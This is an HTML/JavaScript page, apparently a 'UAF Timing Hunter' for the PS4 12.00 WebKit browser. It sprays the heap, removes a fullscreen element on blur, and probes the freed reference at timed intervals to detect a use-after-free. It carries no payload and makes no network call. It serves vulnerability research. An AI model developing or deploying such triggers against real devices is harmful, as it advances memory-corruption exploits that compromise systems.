<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF Timing Hunter</title>
</head>
<body style="background:#111;color:#0f0;">

<h2>PS4 12.00 - UAF Timing Hunter</h2>
<button onclick="runTest()">Run Test</button>

<pre id="log" style="height:320px;overflow:auto;"></pre>

<script>
const PATTERN = 2.121995791e-314;

function log(msg) {
    try { console.log(msg); } catch(e){}
    document.getElementById("log").textContent += msg + "\n";
}

// ==========================
// Heap original (inalterado)
// ==========================
function setupHeap() {
    let controllers = [];

    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    return controllers;
}

// ==========================
// Fullscreen original
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    }

    return fsTarget;
}

// ==========================
// Probe avançado
// ==========================
function probeObject(tag, obj) {
    log("---- PROBE " + tag + " ----");

    try {
        log("[innerHTML] " + obj.innerHTML);
    } catch(e) {
        log("[innerHTML ERROR] " + e);
    }

    try {
        obj.innerHTML = "UAF?";
        log("[write] OK");
    } catch(e) {
        log("[write ERROR] " + e);
    }

    try {
        let rect = obj.getBoundingClientRect();
        log("[rect] w=" + rect.width + " h=" + rect.height);
    } catch(e) {
        log("[rect ERROR] " + e);
    }

    try {
        let style = obj.style;
        log("[style] access OK");
    } catch(e) {
        log("[style ERROR] " + e);
    }
}

// ==========================
// Trigger (IDÊNTICO + probes)
// ==========================
function trigger(fsTarget) {
    log("[*] Trigger: remove + exitFullscreen");

    // manter referência global
    window._uafRef = fsTarget;

    try {
        fsTarget.remove();
    } catch(e) {
        log("[ERRO remove] " + e);
    }

    // 🔬 probes em múltiplos tempos
    setTimeout(() => probeObject("50ms", window._uafRef), 50);
    setTimeout(() => probeObject("100ms", window._uafRef), 100);
    setTimeout(() => probeObject("200ms", window._uafRef), 200);
    setTimeout(() => probeObject("400ms", window._uafRef), 400);

    try {
        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
        }
    } catch(e) {
        log("[ERRO exit] " + e);
    }

    setTimeout(() => location.reload(), 500);
}

// ==========================
// Execução (fluxo ORIGINAL)
// ==========================
function runTest() {
    document.getElementById("log").textContent = "Running... Press OPTIONS\n";

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

    // 🔥 sincronização com evento real do WebKit
    document.addEventListener("webkitfullscreenchange", () => {
        log("[EVENT] fullscreenchange");

        setTimeout(() => {
            probeObject("EVENT+100ms", window._uafRef);
        }, 100);
    });

    window.onblur = function() {
        log("[*] onblur disparado");

        // 🔥 fluxo original preservado
        setTimeout(() => trigger(fsTarget), 3000);
    };
}
</script>

</body>
</html>
